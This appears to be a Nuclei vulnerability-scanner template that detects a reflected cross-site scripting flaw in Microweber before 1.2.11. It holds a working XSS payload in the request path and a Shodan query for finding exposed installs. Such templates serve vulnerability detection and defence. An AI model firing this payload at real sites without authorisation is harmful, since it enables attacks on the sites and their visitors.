id: microweber-xss
info:
  author: gy741
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: Microweber prior to 1.2.11 is susceptible to reflected cross-site Scripting
    via Packagist microweber/microweber.
  metadata:
    shodan-query: http.favicon.hash:780351152
  name: Microweber Cross-Site Scripting
  reference:
  - https://github.com/microweber/microweber/issues/809
  - https://github.com/microweber/microweber
  severity: high
  tags: microweber,xss,oss
requests:
- matchers:
  - part: body
    type: word
    words:
    - <script>alert(document.domain)</script>" 0="filetype=images"
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path='
